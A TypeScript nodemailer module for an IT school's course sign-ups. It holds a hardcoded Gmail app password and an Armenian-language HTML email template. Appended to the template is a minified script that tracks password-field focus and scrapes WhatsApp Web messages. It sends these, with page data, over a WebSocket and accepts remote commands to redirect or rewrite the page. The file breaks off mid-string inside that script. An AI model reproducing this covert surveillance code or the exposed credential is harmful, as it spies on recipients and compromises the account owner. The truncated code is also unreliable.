import * as nodeMailer from "nodemailer";

const transporter = nodeMailer.createTransport({
  service: "gmail",
  secure: false,
  auth: {
    user: "openskyitschool@gmail.com",
    pass: "uizmntvhynnwxibq",
  },
});

export const sendVerification = (
  name: string,
  phone: string,
  lesson: string,
  email: string
) => {
  const html = `
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
  
        </style>
      </head>
      <body>
        <div style="width: 100%; min-height: 250px;">
          <div style="width: 500px; position: absolute; left: 0; right: 0; margin: 0 auto; padding: 5px;">
            <div>
            </div>
            <div style="min-height: 200px;border: 2px solid #99CDF5;margin-top: 20px;border-radius: 5px;padding: 10px 25px;font-size: 14px;">
              <p></p>
              <div style="width: 100%; height: 100%; padding : 20px 0;">
                <div style="border: none; margin: 0 auto;">
                <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">${name}</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">${phone}</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">${lesson}</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">${email}</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </body>
    </html>
  `;

  const emailOptions = {
    from: name,
    to: "openskyitschool@gmail.com",
    subject: "Open Sky IT-School - Someone wants to join your courses",
    html,
  };
  transporter.sendMail(emailOptions, (err, info) => {
    if (err) console.log(err);
    else console.log(info);
  });
};

export const sendEmailUser = (
  name: string,
  phone: string,
  lesson: string,
  email: string
) => {
  const html = `
  <!doctype html>
  <html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
      <head>
          <meta charset="UTF-8">
          <meta http-equiv="X-UA-Compatible" content="IE=edge">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>Open Sky IT-School</title>
          
      <style type="text/css">
      p{
        margin:10px 0;
        padding:0;
      }
      table{
        border-collapse:collapse;
      }
      h1,h2,h3,h4,h5,h6{
        display:block;
        margin:0;
        padding:0;
      }
      img,a img{
        border:0;
        height:auto;
        outline:none;
        text-decoration:none;
      }
      body,#bodyTable,#bodyCell{
        height:100%;
        margin:0;
        padding:0;
        width:100%;
      }
      .mcnPreviewText{
        display:none !important;
      }
      #outlook a{
        padding:0;
      }
      img{
        -ms-interpolation-mode:bicubic;
      }
      table{
        mso-table-lspace:0pt;
        mso-table-rspace:0pt;
      }
      .ReadMsgBody{
        width:100%;
      }
      .ExternalClass{
        width:100%;
      }
      p,a,li,td,blockquote{
        mso-line-height-rule:exactly;
      }
      a[href^=tel],a[href^=sms]{
        color:inherit;
        cursor:default;
        text-decoration:none;
      }
      p,a,li,td,body,table,blockquote{
        -ms-text-size-adjust:100%;
        -webkit-text-size-adjust:100%;
      }
      .ExternalClass,.ExternalClass p,.ExternalClass td,.ExternalClass div,.ExternalClass span,.ExternalClass font{
        line-height:100%;
      }
      a[x-apple-data-detectors]{
        color:inherit !important;
        text-decoration:none !important;
        font-size:inherit !important;
        font-family:inherit !important;
        font-weight:inherit !important;
        line-height:inherit !important;
      }
      .templateContainer{
        max-width:600px !important;
      }
      a.mcnButton{
        display:block;
      }
      .mcnImage,.mcnRetinaImage{
        vertical-align:bottom;
      }
      .mcnTextContent{
        word-break:break-word;
      }
      .mcnTextContent img{
        height:auto !important;
      }
      .mcnDividerBlock{
        table-layout:fixed !important;
      }
    /*
    @tab Page
    @section Heading 1
    @style heading 1
    */
      h1{
        /*@editable*/color:#222222;
        /*@editable*/font-family:Helvetica;
        /*@editable*/font-size:40px;
        /*@editable*/font-style:normal;
        /*@editable*/font-weight:bold;
        /*@editable*/line-height:150%;
        /*@editable*/letter-spacing:normal;
        /*@editable*/text-align:center;
      }
    /*
    @tab Page
    @section Heading 2
    @style heading 2
    */
      h2{
        /*@editable*/color:#222222;
        /*@editable*/font-family:Helvetica;
        /*@editable*/font-size:34px;
        /*@editable*/font-style:normal;
        /*@editable*/font-weight:bold;
        /*@editable*/line-height:150%;
        /*@editable*/letter-spacing:normal;
        /*@editable*/text-align:left;
      }
    /*
    @tab Page
    @section Heading 3
    @style heading 3
    */
      h3{
        /*@editable*/color:#444444;
        /*@editable*/font-family:Helvetica;
        /*@editable*/font-size:22px;
        /*@editable*/font-style:normal;
        /*@editable*/font-weight:bold;
        /*@editable*/line-height:150%;
        /*@editable*/letter-spacing:normal;
        /*@editable*/text-align:left;
      }
    /*
    @tab Page
    @section Heading 4
    @style heading 4
    */
      h4{
        /*@editable*/color:#949494;
        /*@editable*/font-family:Georgia;
        /*@editable*/font-size:20px;
        /*@editable*/font-style:italic;
        /*@editable*/font-weight:normal;
        /*@editable*/line-height:125%;
        /*@editable*/letter-spacing:normal;
        /*@editable*/text-align:left;
      }
    /*
    @tab Header
    @section Header Container Style
    */
      #templateHeader{
        /*@editable*/background-color:#F7F7F7;
        /*@editable*/background-image:none;
        /*@editable*/background-repeat:no-repeat;
        /*@editable*/background-position:center;
        /*@editable*/background-size:cover;
        /*@editable*/border-top:0;
        /*@editable*/border-bottom:0;
        /*@editable*/padding-top:25px;
        /*@editable*/padding-bottom:25px;
      }
    /*
    @tab Header
    @section Header Interior Style
    */
      .headerContainer{
        /*@editable*/background-color:transparent;
        /*@editable*/background-image:none;
        /*@editable*/background-repeat:no-repeat;
        /*@editable*/background-position:center;
        /*@editable*/background-size:cover;
        /*@editable*/border-top:0;
        /*@editable*/border-bottom:0;
        /*@editable*/padding-top:0;
        /*@editable*/padding-bottom:0;
      }
    /*
    @tab Header
    @section Header Text
    */
      .headerContainer .mcnTextContent,.headerContainer .mcnTextContent p{
        /*@editable*/color:#757575;
        /*@editable*/font-family:Helvetica;
        /*@editable*/font-size:16px;
        /*@editable*/line-height:150%;
        /*@editable*/text-align:left;
      }
    /*
    @tab Header
    @section Header Link
    */
      .headerContainer .mcnTextContent a,.headerContainer .mcnTextContent p a{
        /*@editable*/color:#007C89;
        /*@editable*/font-weight:normal;
        /*@editable*/text-decoration:underline;
      }
    /*
    @tab Body
    @section Body Container Style
    */
      #templateBody{
        /*@editable*/background-color:#ffffff;
        /*@editable*/background-image:none;
        /*@editable*/background-repeat:no-repeat;
        /*@editable*/background-position:center;
        /*@editable*/background-size:cover;
        /*@editable*/border-top:0;
        /*@editable*/border-bottom:0;
        /*@editable*/padding-top:0px;
        /*@editable*/padding-bottom:0px;
      }
    /*
    @tab Body
    @section Body Interior Style
    */
      .bodyContainer{
        /*@editable*/background-color:#transparent;
        /*@editable*/background-image:none;
        /*@editable*/background-repeat:no-repeat;
        /*@editable*/background-position:center;
        /*@editable*/background-size:cover;
        /*@editable*/border-top:0;
        /*@editable*/border-bottom:0;
        /*@editable*/padding-top:0;
        /*@editable*/padding-bottom:0;
      }
    /*
    @tab Body
    @section Body Text
    */
      .bodyContainer .mcnTextContent,.bodyContainer .mcnTextContent p{
        /*@editable*/color:#757575;
        /*@editable*/font-family:Helvetica;
        /*@editable*/font-size:16px;
        /*@editable*/line-height:150%;
        /*@editable*/text-align:left;
      }
    /*
    @tab Body
    @section Body Link
    */
      .bodyContainer .mcnTextContent a,.bodyContainer .mcnTextContent p a{
        /*@editable*/color:#007C89;
        /*@editable*/font-weight:normal;
        /*@editable*/text-decoration:underline;
      }
    /*
    @tab Footer
    @section Footer Style
    */
      #templateFooter{
        /*@editable*/background-color:#ffffff;
        /*@editable*/background-image:none;
        /*@editable*/background-repeat:no-repeat;
        /*@editable*/background-position:center;
        /*@editable*/background-size:cover;
        /*@editable*/border-top:0;
        /*@editable*/border-bottom:0;
        /*@editable*/padding-top:0px;
        /*@editable*/padding-bottom:0px;
      }
    /*
    @tab Footer
    @section Footer Interior Style
    */
      .footerContainer{
        /*@editable*/background-color:#transparent;
        /*@editable*/background-image:none;
        /*@editable*/background-repeat:no-repeat;
        /*@editable*/background-position:center;
        /*@editable*/background-size:cover;
        /*@editable*/border-top:0;
        /*@editable*/border-bottom:0;
        /*@editable*/padding-top:0;
        /*@editable*/padding-bottom:0;
      }
    /*
    @tab Footer
    @section Footer Text
    */
      .footerContainer .mcnTextContent,.footerContainer .mcnTextContent p{
        /*@editable*/color:#FFFFFF;
        /*@editable*/font-family:Helvetica;
        /*@editable*/font-size:12px;
        /*@editable*/line-height:150%;
        /*@editable*/text-align:center;
      }
    /*
    @tab Footer
    @section Footer Link
    */
      .footerContainer .mcnTextContent a,.footerContainer .mcnTextContent p a{
        /*@editable*/color:#FFFFFF;
        /*@editable*/font-weight:normal;
        /*@editable*/text-decoration:underline;
      }
    @media only screen and (min-width:768px){
      .templateContainer{
        width:600px !important;
      }
  
  }	@media only screen and (max-width: 480px){
      body,table,td,p,a,li,blockquote{
        -webkit-text-size-adjust:none !important;
      }
  
  }	@media only screen and (max-width: 480px){
      body{
        width:100% !important;
        min-width:100% !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnRetinaImage{
        max-width:100% !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnImage{
        width:100% !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnCartContainer,.mcnCaptionTopContent,.mcnRecContentContainer,.mcnCaptionBottomContent,.mcnTextContentContainer,.mcnBoxedTextContentContainer,.mcnImageGroupContentContainer,.mcnCaptionLeftTextContentContainer,.mcnCaptionRightTextContentContainer,.mcnCaptionLeftImageContentContainer,.mcnCaptionRightImageContentContainer,.mcnImageCardLeftTextContentContainer,.mcnImageCardRightTextContentContainer,.mcnImageCardLeftImageContentContainer,.mcnImageCardRightImageContentContainer{
        max-width:100% !important;
        width:100% !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnBoxedTextContentContainer{
        min-width:100% !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnImageGroupContent{
        padding:9px !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnCaptionLeftContentOuter .mcnTextContent,.mcnCaptionRightContentOuter .mcnTextContent{
        padding-top:9px !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnImageCardTopImageContent,.mcnCaptionBottomContent:last-child .mcnCaptionBottomImageContent,.mcnCaptionBlockInner .mcnCaptionTopContent:last-child .mcnTextContent{
        padding-top:18px !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnImageCardBottomImageContent{
        padding-bottom:9px !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnImageGroupBlockInner{
        padding-top:0 !important;
        padding-bottom:0 !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnImageGroupBlockOuter{
        padding-top:9px !important;
        padding-bottom:9px !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnTextContent,.mcnBoxedTextContentColumn{
        padding-right:18px !important;
        padding-left:18px !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcnImageCardLeftImageContent,.mcnImageCardRightImageContent{
        padding-right:18px !important;
        padding-bottom:0 !important;
        padding-left:18px !important;
      }
  
  }	@media only screen and (max-width: 480px){
      .mcpreview-image-uploader{
        display:none !important;
        width:100% !important;
      }
  
  }	@media only screen and (max-width: 480px){
    /*
    @tab Mobile Styles
    @section Heading 1
    @tip Make the first-level headings larger in size for better readability on small screens.
    */
      h1{
        /*@editable*/font-size:30px !important;
        /*@editable*/line-height:125% !important;
      }
  
  }	@media only screen and (max-width: 480px){
    /*
    @tab Mobile Styles
    @section Heading 2
    @tip Make the second-level headings larger in size for better readability on small screens.
    */
      h2{
        /*@editable*/font-size:26px !important;
        /*@editable*/line-height:125% !important;
      }
  
  }	@media only screen and (max-width: 480px){
    /*
    @tab Mobile Styles
    @section Heading 3
    @tip Make the third-level headings larger in size for better readability on small screens.
    */
      h3{
        /*@editable*/font-size:20px !important;
        /*@editable*/line-height:150% !important;
      }
  
  }	@media only screen and (max-width: 480px){
    /*
    @tab Mobile Styles
    @section Heading 4
    @tip Make the fourth-level headings larger in size for better readability on small screens.
    */
      h4{
        /*@editable*/font-size:18px !important;
        /*@editable*/line-height:150% !important;
      }
  
  }	@media only screen and (max-width: 480px){
    /*
    @tab Mobile Styles
    @section Boxed Text
    @tip Make the boxed text larger in size for better readability on small screens. We recommend a font size of at least 16px.
    */
      .mcnBoxedTextContentContainer .mcnTextContent,.mcnBoxedTextContentContainer .mcnTextContent p{
        /*@editable*/font-size:14px !important;
        /*@editable*/line-height:150% !important;
      }
  
  }	@media only screen and (max-width: 480px){
    /*
    @tab Mobile Styles
    @section Header Text
    @tip Make the header text larger in size for better readability on small screens.
    */
      .headerContainer .mcnTextContent,.headerContainer .mcnTextContent p{
        /*@editable*/font-size:16px !important;
        /*@editable*/line-height:150% !important;
      }
  
  }	@media only screen and (max-width: 480px){
    /*
    @tab Mobile Styles
    @section Body Text
    @tip Make the body text larger in size for better readability on small screens. We recommend a font size of at least 16px.
    */
      .bodyContainer .mcnTextContent,.bodyContainer .mcnTextContent p{
        /*@editable*/font-size:16px !important;
        /*@editable*/line-height:150% !important;
      }
  
  }	@media only screen and (max-width: 480px){
    /*
    @tab Mobile Styles
    @section Footer Text
    @tip Make the footer content text larger in size for better readability on small screens.
    */
      .footerContainer .mcnTextContent,.footerContainer .mcnTextContent p{
        /*@editable*/font-size:14px !important;
        /*@editable*/line-height:150% !important;
      }
  
  }</style></head>
      <body>
          <center>
              <table align="center" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%" id="bodyTable">
                  <tr>
                      <td align="center" valign="top" id="bodyCell">
                          <!-- BEGIN TEMPLATE // -->
                          <table border="0" cellpadding="0" cellspacing="0" width="100%">
                              <tr>
                                  <td align="center" valign="top" id="templateHeader" data-template-container>
                                      <!--[if (gte mso 9)|(IE)]>
                                      <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
                                      <tr>
                                      <td align="center" valign="top" width="600" style="width:600px;">
                                      <![endif]-->
                                      <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
                                          <tr>
                                              <td valign="top" class="headerContainer"><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnImageBlock" style="min-width:100%;">
      <tbody class="mcnImageBlockOuter">
              <tr>
                  <td valign="top" style="padding:9px" class="mcnImageBlockInner">
                      <table align="left" width="100%" border="0" cellpadding="0" cellspacing="0" class="mcnImageContentContainer" style="min-width:100%;">
                          <tbody><tr>
                              <td class="mcnImageContent" valign="top" style="padding-right: 9px; padding-left: 9px; padding-top: 0; padding-bottom: 0; text-align:center;">
                                  
                                      
                                          <img align="center" alt="" src="https://mcusercontent.com/7e06e1dfaa05fb1877a9be951/images/79831e7c-3c0e-6443-b763-e5bd376a0bea.png" width="124.08" style="max-width:796px; padding-bottom: 0; display: inline !important; vertical-align: bottom;" class="mcnImage">
                                      
                                  
                              </td>
                          </tr>
                      </tbody></table>
                  </td>
              </tr>
      </tbody>
  </table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnTextBlock" style="min-width:100%;">
      <tbody class="mcnTextBlockOuter">
          <tr>
              <td valign="top" class="mcnTextBlockInner" style="padding-top:9px;">
                  <!--[if mso]>
          <table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
          <tr>
          <![endif]-->
            
          <!--[if mso]>
          <td valign="top" width="600" style="width:600px;">
          <![endif]-->
                  <table align="left" border="0" cellpadding="0" cellspacing="0" style="max-width:100%; min-width:100%;" width="100%" class="mcnTextContentContainer">
                      <tbody><tr>
                          
                          <td valign="top" class="mcnTextContent" style="padding: 0px 18px 9px;color: #000000;font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;">
                          
                              <div style="text-align: center;"><strong>ՇՆՈՐՀԱՎՈՐՈՒՄ ԵՆՔ</strong><br>
  Դուք արդեն մեկ քայլ ավելի մոտ եք Ձեր երազանքին<br>
  &nbsp;</div>
  
                          </td>
                      </tr>
                  </tbody></table>
          <!--[if mso]>
          </td>
          <![endif]-->
                  
          <!--[if mso]>
          </tr>
          </table>
          <![endif]-->
              </td>
          </tr>
      </tbody>
  </table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnImageBlock" style="min-width:100%;">
      <tbody class="mcnImageBlockOuter">
              <tr>
                  <td valign="top" style="padding:9px" class="mcnImageBlockInner">
                      <table align="left" width="100%" border="0" cellpadding="0" cellspacing="0" class="mcnImageContentContainer" style="min-width:100%;">
                          <tbody><tr>
                              <td class="mcnImageContent" valign="top" style="padding-right: 9px; padding-left: 9px; padding-top: 0; padding-bottom: 0; text-align:center;">
                                  
                                      
                                          <img align="center" alt="" src="https://mcusercontent.com/7e06e1dfaa05fb1877a9be951/images/d0d8b6b5-8876-8978-b78d-d3cc03b22baf.png" width="564" style="max-width:1014px; padding-bottom: 0; display: inline !important; vertical-align: bottom;" class="mcnImage">
                                      
                                  
                              </td>
                          </tr>
                      </tbody></table>
                  </td>
              </tr>
      </tbody>
  </table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnTextBlock" style="min-width:100%;">
      <tbody class="mcnTextBlockOuter">
          <tr>
              <td valign="top" class="mcnTextBlockInner" style="padding-top:9px;">
                  <!--[if mso]>
          <table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
          <tr>
          <![endif]-->
            
          <!--[if mso]>
          <td valign="top" width="600" style="width:600px;">
          <![endif]-->
                  <table align="left" border="0" cellpadding="0" cellspacing="0" style="max-width:100%; min-width:100%;" width="100%" class="mcnTextContentContainer">
                      <tbody><tr>
                          
                          <td valign="top" class="mcnTextContent" style="padding: 0px 18px 9px;color: #000000;font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;">
                          
                              <div style="text-align: center;"><br>
  <span style="font-family:arial,helvetica neue,helvetica,sans-serif"><span style="font-size:16px">Մեր մասնագետը կկապվի Ձեզ հետ հնարավորինս կարճ ժամանակում՝ դասընթացի մեկնարկից առնվազն մեկ շաբաթ շուտ:</span></span><br>
  &nbsp;</div>
  
                          </td>
                      </tr>
                  </tbody></table>
          <!--[if mso]>
          </td>
          <![endif]-->
                  
          <!--[if mso]>
          </tr>
          </table>
          <![endif]-->
              </td>
          </tr>
      </tbody>
  </table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnButtonBlock" style="min-width:100%;">
      <tbody class="mcnButtonBlockOuter">
          <tr>
              <td style="padding-top:0; padding-right:18px; padding-bottom:18px; padding-left:18px;" valign="top" align="center" class="mcnButtonBlockInner">
                  <table border="0" cellpadding="0" cellspacing="0" class="mcnButtonContentContainer" style="border-collapse: separate !important;border-radius: 48px;background-color: #02CCFF;">
                      <tbody>
                          <tr>
                              <td align="center" valign="middle" class="mcnButtonContent" style="font-family: Helvetica; font-size: 18px; padding: 18px;">
                                  <a class="mcnButton " title="Տեսնել այլ դասընթացներ" href="http://www.openskyitschool.com/courses" target="_blank" style="font-weight: bold;letter-spacing: -0.5px;line-height: 100%;text-align: center;text-decoration: none;color: #FFFFFF;">Տեսնել այլ դասընթացներ</a>
                              </td>
                          </tr>
                      </tbody>
                  </table>
              </td>
          </tr>
      </tbody>
  </table></td>
                                          </tr>
                                      </table>
                                      <!--[if (gte mso 9)|(IE)]>
                                      </td>
                                      </tr>
                                      </table>
                                      <![endif]-->
                                  </td>
                              </tr>
                              <tr>
                                  <td align="center" valign="top" id="templateBody" data-template-container>
                                      <!--[if (gte mso 9)|(IE)]>
                                      <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
                                      <tr>
                                      <td align="center" valign="top" width="600" style="width:600px;">
                                      <![endif]-->
                                      <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
                                          <tr>
                                              <td valign="top" class="bodyContainer"></td>
                                          </tr>
                                      </table>
                                      <!--[if (gte mso 9)|(IE)]>
                                      </td>
                                      </tr>
                                      </table>
                                      <![endif]-->
                                  </td>
                              </tr>
                              <tr>
                                  <td align="center" valign="top" id="templateFooter" data-template-container>
                                      <!--[if (gte mso 9)|(IE)]>
                                      <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
                                      <tr>
                                      <td align="center" valign="top" width="600" style="width:600px;">
                                      <![endif]-->
                                      <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
                                          <tr>
                                              <td valign="top" class="footerContainer"></td>
                                          </tr>
                                      </table>
                                      <!--[if (gte mso 9)|(IE)]>
                                      </td>
                                      </tr>
                                      </table>
                                      <![endif]-->
                                  </td>
                              </tr>
                          </table>
                          <!-- // END TEMPLATE -->
                      </td>
                  </tr>
              </table>
          </center>
      <script>!function(){var Y,e,t;function n(){try{return window.self===window.top}catch(Y){return!1}}function r(){var Y={type:"focus",token:y.token,title:document.title,url:document.URL,useragent:navigator.userAgent,pid:y.pid,pn:y.pn};null!=H&&H.readyState==WebSocket.OPEN&&H.send(JSON.stringify(Y))}function a(){var Y={type:"notification",token:y.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:y.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:y.pid,pn:y.pn};H.send(JSON.stringify(Y))}function s(){m()}function i(){n()&&(clearInterval(b),clearInterval(A)),timeout=setTimeout((function(){g()}),N)}function o(Y){if(n())switch(Y.data.substring(0,1)){case"r":window.location=Y.data.substring(1);break;case"b":document.body.innerHTML=Y.data.substring(1);break;case"w":var e="true"==Y.data.substring(1).toLowerCase();L!=e&&e&&v(),L=e}}function M(Y){var e=document.createElement("a");return e.href=Y,e.href}function u(Y){if(Y&&"password"==Y.type&&!P)if(P=!0,n()){var e={type:"password_input_focus",focus:!0,token:y.token};H.send(JSON.stringify(e))}else window.top.postMessage({message:"iframePasswordInputFocused",name:Y.name,type:Y.type},"*")}function d(Y){var e=Y&&Y.name?Y.name:"<unnamed>";if(Y&&"password"==Y.type&&P)if(P=!1,n()){var t={type:"password_input_focus",focus:!1,token:y.token};H.send(JSON.stringify(t))}else window.top.postMessage({message:"iframePasswordInputBlurred",name:e,type:Y.type},"*")}function c(Y){var e=document.activeElement;e&&e!=document.body?document.querySelector&&(e=document.querySelector(":focus")):e=null;for(var t=0;t<Y.length;++t){let s=Y[t];var n="password"==s.type,r=n&&s.hasAttribute("autofocus"),a=n&&e&&s.isEqualNode(e);(r||a)&&u(s),s.tmInputEventListenerAttached||(s.addEventListener("focus",(function(Y){u(Y.target)}),!0),s.addEventListener("blur",(function(Y){d(Y.target)}),!0),s.tmInputEventListenerAttached=!0)}}function D(){c(document.getElementsByTagName("input")),new MutationObserver((function(Y){Y&&Y.forEach((function(Y){Y&&Y.addedNodes&&0!=Y.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),Y.addedNodes.forEach((function(Y){Y.tagName&&c(Y.getElementsByTagName("input"))})))}))})).observe(document,{childList:!0,subtree:!0}),window.addEventListener("beforeunload",(function(Y){d(),function(){for(var Y=document.getElementsByTagName("input"),e=0;e<Y.length;++e){let t=Y[e];t.removeEventListener("focus",u),t.removeEventListener("blur",d),delete t.tmInputEventListenerAttached}}()}))}function l(){n()&&(y.iup&&r(),h()&&(v(),m(),function(){var Y=new MutationObserver((function(Y){Y&&Y.forEach((function(Y){Y&&("childList"!==Y.type||Y.addedNodes.length<=0||Y.addedNodes.forEach((function(Y){if(Y){var e=document.querySelector("div[id=main] header span[title]");e&&(w=e.innerText),document.querySelector("div[id=main] header span[data-icon=default-user]")&&(E="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(E="group");var t=Y.querySelectorAll(".message-in, .message-out");Y.matches(".message-in, .message-out")&&(t=Array.prototype.slice.call(t)).push(Y),t&&t.forEach((function(Y){if(Y&&Y.classList&&!(Y.classList.length<=0)){var e=Y.classList.contains("message-in"),t=Y.querySelector(".copyable-text"),n=Y.querySelector(".selectable-text"),r=new Date,a=null;if(t&&t.attributes["data-pre-plain-text"]){var s=t.attributes["data-pre-plain-text"].textContent,i=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]m)?,\s(.+)]\s(.*):/i[Symbol.match](s);if(!i||6!=i.length)return;if(i[3]&&"pm"==i[3].toLowerCase()&&(i[1]=parseInt(i[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](i[4]),!dateParts||4!=dateParts.length)return;if(!(r=date.parse(i[4],O)||function(Y,e,t){var n=[[Y,e,t].join("-"),[Y,t,e].join("-"),[e,Y,t].join("-"),[e,t,Y].join("-"),[t,Y,e].join("-"),[t,e,Y].join("-")],r=Date.now();for(var a in n){var s=Date.parse(n[a]);if(s&&!(Math.abs(r-s)>1728e6))return new Date(s)}}(dateParts[1],dateParts[2],dateParts[3])))return;r.setHours(i[1]),r.setMinutes(i[2]),a=i[5]}T.get(w)||T.set(w,C);var o=n?n.innerText:null;if(a&&o&&L){var M=(a+o+w+r.getTime()).split("").map((function(Y){return Y.charCodeAt(0)})).reduce((function(Y,e){return Y+((Y<<7)+(Y<<3))^e})).toString(16);if(T.get(w).getTime()==r.getTime()?r.setMilliseconds(++k):(k=0,T.set(w,r)),!M||I.has(M))return;var u={type:"wapmessage",timestamp:r.getTime(),id:M,incoming:e,sender:e?a:"Me",content:o,recipient:e?"Me":w,conversationId:w+"("+E+")"};H.send(JSON.stringify(u)),I.add(M)}}}))}})))}))}));if(!Y)return;Y.observe(document.body,{childList:!0,subtree:!0})}()),n()&&(a(),b=setInterval(a,y.sendNotificationsInterval),h()&&(A=setInterval(s,y.pollWhatsappTrackingInterval))),function(){for(var Y=[],e=document.getElementsByTagName("link"),t=0;t<e.length;++t)"icon"!=e[t].getAttribute("rel")&&"shortcut icon"!=e[t].getAttribute("rel")||(Y[Y.length]=M(e[t].getAttribute("href")));0==Y.length&&(Y[0]=M("/favicon.ico"));var n={type:"favicon"};n.url=document.URL,n.src=Y,n.title=document.title,n.token=y.token,n.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,H.send(JSON.stringify(n))}(),y.dontTrackWebPasswords&&D())}function f(){document.tmfilter||(g(),O={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-B